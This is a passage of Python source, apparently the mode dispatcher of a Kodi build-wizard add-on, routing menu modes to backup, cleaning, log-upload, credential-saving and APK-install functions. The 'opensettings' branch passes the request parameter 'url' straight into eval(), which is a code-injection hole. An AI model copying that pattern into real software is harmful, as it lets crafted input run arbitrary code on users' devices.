elif mode =='theme':buildWizard (name ,mode ,url )#line:5600
elif mode =='viewthirdparty':viewThirdList (name )#line:5601
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5602
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5603
elif mode =='maint':maintMenu (name )#line:5605
elif mode =='passpin':passandpin ()#line:5606
elif mode =='backmyupbuild':backmyupbuild ()#line:5607
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5608
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5609
elif mode =='advancedsetting':advancedWindow (name )#line:5610
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5611
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5612
elif mode =='asciicheck':wiz .asciiCheck ()#line:5613
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5614
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5615
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5616
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5617
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5618
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5619
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5620
elif mode =='currentsettings':viewAdvanced ()#line:5621
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5622
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5623
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5624
elif mode =='fixskin':backtokodi ()#line:5625
elif mode =='testcommand':testcommand ()#line:5626
elif mode =='logsend':logsend ()#line:5627
elif mode =='rdon':rdon ()#line:5628
elif mode =='rdoff':rdoff ()#line:5629
elif mode =='setrd':setrealdebrid ()#line:5630
elif mode =='setrd2':setautorealdebrid ()#line:5631
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5632
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5633
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5634
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5635
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5636
elif mode =='freshstart':freshStart ()#line:5637
elif mode =='forceupdate':wiz .forceUpdate ()#line:5638
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5639
elif mode =='forceclose':wiz .killxbmc ()#line:5640
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5641
elif mode =='hidepassword':wiz .hidePassword ()#line:5642
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5643
elif mode =='enableaddons':enableAddons ()#line:5644
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5645
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5646
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5647
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5648
elif mode =='uploadlog':uploadLog .Main ()#line:5649
elif mode =='viewlog':LogViewer ()#line:5650
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5651
elif mode =='viewerrorlog':errorChecking (all =True )#line:5652
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5653
elif mode =='purgedb':purgeDb ()#line:5654
elif mode =='fixaddonupdate':fixUpdate ()#line:5655
elif mode =='removeaddons':removeAddonMenu ()#line:5656
elif mode =='removeaddon':removeAddon (name )#line:5657
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5658
elif mode =='removedata':removeAddonData (name )#line:5659
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5660
elif mode =='systeminfo':systemInfo ()#line:5661
elif mode =='restorezip':restoreit ('build')#line:5662
elif mode =='restoregui':restoreit ('gui')#line:5663
elif mode =='restoreaddon':restoreit ('addondata')#line:5664
elif mode =='restoreextzip':restoreextit ('build')#line:5665
elif mode =='restoreextgui':restoreextit ('gui')#line:5666
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5667
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5668
elif mode =='traktsync':traktsync ()#line:5669
elif mode =='apk':apkMenu (name )#line:5671
elif mode =='apkscrape':apkScraper (name )#line:5672
elif mode =='apkinstall':apkInstaller (name ,url )#line:5673
elif mode =='speed':speedMenu ()#line:5674
elif mode =='net':net_tools ()#line:5675
elif mode =='GetList':GetList (url )#line:5676
elif mode =='youtube':youtubeMenu (name )#line:5677
elif mode =='viewVideo':playVideo (url )#line:5678
elif mode =='addons':addonMenu (name )#line:5680
elif mode =='addoninstall':addonInstaller (name ,url )#line:5681
elif mode =='savedata':saveMenu ()#line:5683
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5684
elif mode =='managedata':manageSaveData (name )#line:5685
elif mode =='whitelist':wiz .whiteList (name )#line:5686
elif mode =='trakt':traktMenu ()#line:5688
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5689
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5690
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5691
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5692
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5693
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5694
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5695
elif mode =='realdebrid':realMenu ()#line:5697
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5698
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5699
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5700
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5701
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5702
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5703
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5704
elif mode =='login':loginMenu ()#line:5706
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5707
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5708
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5709
elif mode =='clearlogin':loginit .clearSaved (name )#line:5710
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5711
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5712
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5713
elif mode =='contact':notify .contact (CONTACT )#line:5715
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5716
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5717
elif mode =='developer':developer ()#line:5719
elif mode =='converttext':wiz .convertText ()#line:5720
elif mode =='createqr':wiz .createQR ()#line:5721
elif mode =='testnotify':testnotify ()#line:5722
elif mode =='testnotify2':testnotify2 ()#line:5723
elif mode =='servicemanual':servicemanual ()#line:5724
elif mode =='fastinstall':fastinstall ()#line:5725
elif mode =='testupdate':testupdate ()#line:5726
elif mode =='testfirst':testfirst ()#line:5727
elif mode =='testfirstrun':testfirstRun ()#line:5728
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5729
elif mode =='bg':wiz .bg_install (name ,url )#line:5731
elif mode =='bgcustom':wiz .bg_custom ()#line:5732
elif mode =='bgremove':wiz .bg_remove ()#line:5733
elif mode =='bgdefault':wiz .bg_default ()#line:5734
elif mode =='rdset':rdsetup ()#line:5735
elif mode =='mor':morsetup ()#line:5736
elif mode =='mor2':morsetup2 ()#line:5737
elif mode =='resolveurl':resolveurlsetup ()#line:5738
elif mode =='urlresolver':urlresolversetup ()#line:5739
elif mode =='forcefastupdate':forcefastupdate ()#line:5740
elif mode =='traktset':traktsetup ()#line:5741
elif mode =='placentaset':placentasetup ()#line:5742
elif mode =='flixnetset':flixnetsetup ()#line:5743
elif mode =='reptiliaset':reptiliasetup ()#line:5744
elif mode =='yodasset':yodasetup ()#line:5745
elif mode =='numbersset':numberssetup ()#line:5746
elif mode =='uranusset':uranussetup ()#line:5747
elif mode =='genesisset':genesissetup ()#line:5748
elif mode =='fastupdate':fastupdate ()#line:5749
elif mode =='folderback':folderback ()#line:5750
elif mode =='menudata':Menu ()#line:5751
elif mode ==2 :#line:5753
        wiz .torent_menu ()#line:5754
elif mode ==3 :#line:5755
        wiz .popcorn_menu ()#line:5756
elif mode ==8 :#line:5757
        wiz .metaliq_fix ()#line:5758
elif mode ==9 :#line:5759
        wiz .quasar_menu ()#line:5760
elif mode ==5 :#line:5761
        swapSkins ('skin.Premium.mod')#line:5762
elif mode ==13 :#line:5763
        wiz .elementum_menu ()#line:5764
elif mode ==16 :#line:5765
        wiz .fix_wizard ()#line:5766
elif mode ==17 :#line:5767
        wiz .last_play ()#line:5768
elif mode ==18 :#line:5769
        wiz .normal_metalliq ()#line:5770
elif mode ==19 :#line:5771
        wiz .fast_metalliq ()#line:5772
elif mode ==20 :#line:5773
        wiz .fix_buffer2 ()#line:5774
elif mode ==21 :#line:5775
        wiz .fix_buffer3 ()#line:5776
elif mode ==11 :#line:5777
        wiz .fix_buffer ()#line:5778
elif mode ==15 :#line:5779
        wiz .fix_font ()#line:5780
elif mode ==14 :#line:5781
        wiz .clean_pass ()#line:5782
elif mode ==22 :#line:5783
        wiz .movie_update ()#line:5784
elif mode =='adv_settings':buffer1 ()#line:5785
elif mode =='getpass':getpass ()#line:5786
elif mode =='setpass':setpass ()#line:5787
elif mode =='setuname':setuname ()#line:5788
elif mode =='passandUsername':passandUsername ()#line:5789
elif mode =='9':disply_hwr ()#line:5790
elif mode =='99':disply_hwr2 ()#line:5791
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))